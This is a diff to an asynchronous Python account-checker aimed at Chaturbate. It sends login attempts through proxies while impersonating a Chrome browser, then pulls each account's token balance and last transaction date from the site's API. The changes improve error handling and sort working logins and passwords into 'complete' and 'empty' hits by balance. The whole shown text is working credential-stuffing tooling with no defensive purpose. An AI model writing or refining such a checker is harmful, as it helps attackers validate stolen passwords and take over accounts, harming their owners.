@@ -754,7 +754,7 @@ async def fetch_data_cookies_checker(account, proxy):
 
         # print(response.text())
         proxies = { 
-            "socks5" : proxy, 
+            "https" : proxy, 
         }
         response = await session.get("https://chaturbate.com/auth/login", impersonate="chrome110", proxies=proxies)
         
@@ -789,10 +789,13 @@ async def fetch_data_cookies_checker(account, proxy):
         
         url = f'https://chaturbate.com/api/ts/tipping/token-stats/?room={username}&currentpage=&max_transaction_id=&cashpage=0'
         response = await session.get(url, cookies=session.cookies, impersonate="chrome110", proxies=proxies)
-        
+        data = []
         print(response)
-        print(response.json())
-        data = response.json()
+        try:
+            data = response.json()
+        except json.JSONDecodeError:
+            return {}
+            
         if not data:
             return {}
      
@@ -800,14 +803,18 @@ async def fetch_data_cookies_checker(account, proxy):
         if 'transactions' in data:
             transactions = data['transactions']
             if transactions:
+                token_balance = data['token_balance']
                 last_transaction_date = transactions[0]['date']
-                return {"acc_login": username, "acc_password": password, "type": 'transaction', "transaction": last_transaction_date}
+                return {"acc_login": username, "acc_password": password, "type": 'complete', "token_balance": token_balance, "transaction": last_transaction_date}
             else:
-                return {}
+                if 'periods' in data:
+                    token_balance = data['token_balance']
+                    return {"acc_login": username, "acc_password": password, "type": 'empty', "token_balance": token_balance, "transaction": ""}
+                else:
+                    return {}
         else:
             if 'periods' in data:
-                periods = data['periods']
-                return {"acc_login": username, "acc_password": password, "type": 'default', "transaction": ""}
+                return {"acc_login": username, "acc_password": password, "type": 'empty', "transaction": ""}
             else:
                 return {}
         
@@ -833,7 +840,8 @@ def sync_main_checker(accounts, proxies):
     all_results = asyncio.run(main_checker_func_second(accounts, proxies))
 
     for result in all_results:
-        results.append(result)
+        if result:
+            results.append(result)
 
     return results
 
